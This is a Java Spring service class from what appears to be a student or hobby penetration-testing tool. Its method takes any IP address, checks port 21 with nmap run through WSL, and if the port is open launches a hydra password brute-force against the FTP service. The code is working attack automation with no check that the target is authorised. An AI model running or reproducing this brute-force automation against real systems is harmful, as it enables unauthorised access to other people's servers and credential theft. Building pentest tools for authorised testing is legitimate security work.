package org.penforge.backend.ftp;

import org.springframework.stereotype.Service;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;

@Service
public class AttackService {

//FTP saldırısı gerçekleştiren metod.
    public String performFtpBruteforce(String ip) {
        //String nmapCommand = "nmap -sS -p 21 " + ip;
        //String hydraCommand = "hydra -l user -P /path/to/passwordlist.txt ftp://" + ip;
        // bu komutlar daha sonra girdi almak için kullanılabilir. Bora Furkan bakın. 

        try {
            // nmap ile FTP port kontrolü
            ProcessBuilder pbNmap = new ProcessBuilder("wsl", "nmap", "-sS", "-p", "21", ip);
            Process nmapProcess = pbNmap.start();
            String nmapOutput = readProcessOutput(nmapProcess);

            if (nmapOutput.contains("21/open")) {
                // Hydra ile bruteforce saldırısı başlatma
                ProcessBuilder pbHydra = new ProcessBuilder("wsl", "hydra", "-l", "user", "-P", "/path/to/passwordlist.txt", "ftp://" + ip);
                Process hydraProcess = pbHydra.start();
                return readProcessOutput(hydraProcess);
            } else {
                return "No open FTP ports found on " + ip;
            }
        } catch (Exception e) {
            e.printStackTrace();
            return "Error during attack execution: " + e.getMessage();
        }
    }

    // process çıktısını okuyan metot
    private String readProcessOutput(Process process) throws IOException {
        BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
        StringBuilder output = new StringBuilder();
        String line;

        //çıktıyı okur
        while ((line = reader.readLine()) != null) {
            output.append(line).append("\n");
        }
        try {
            process.waitFor();
        } catch (InterruptedException e) {
            Thread.currentThread().interrupt();
        }

        return output.toString();
    }
}
